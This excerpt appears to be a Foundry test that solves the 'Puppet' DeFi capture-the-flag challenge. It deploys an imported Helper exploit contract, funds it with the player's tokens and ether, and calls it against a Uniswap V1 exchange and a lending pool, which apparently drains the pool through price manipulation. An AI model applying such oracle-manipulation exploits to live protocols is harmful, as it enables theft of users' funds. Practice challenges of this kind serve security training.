...
import {Helper} from "./Puppet_exploiter.sol";
...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
     Helper attacker = new Helper();
     token.transfer(address(attacker), token.balanceOf(player));
     address(attacker).call{value: address(player).balance}("");
    attacker.oneshot(address(uniswapV1Exchange), address(token), address(lendingPool), recovery);
    console.logUint(token.balanceOf(address(lendingPool)));
    }
